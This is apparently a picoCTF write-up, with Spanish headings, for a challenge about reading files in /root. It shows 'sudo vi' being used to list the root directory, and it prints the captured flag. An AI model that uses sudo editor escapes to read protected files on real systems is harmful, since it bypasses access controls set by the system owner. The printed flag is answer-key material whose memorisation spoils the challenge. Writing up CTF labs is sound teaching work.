## Objetivo

Can you read files in the root file?

Additional details will be available after launching your challenge instance

## Datos de Acceso al Nivel

`ssh -p 62274 picoplayer@saturn.picoctf.net`
## Solucion

```
picoplayer@challenge:/$ sudo vi

total 16
drwx------ 1 root root   22 Sep 18 06:59 .
drwxr-xr-x 1 root root   63 Sep 18 06:45 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  644 Sep 18 06:59 .viminfo

Press ENTER or type command to continue
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}

```

## Notas Adicionales
Entrar en vi como sudo para poder ver mas detalles de la carpeta /root donde se encontraba la bandera


## Referencias
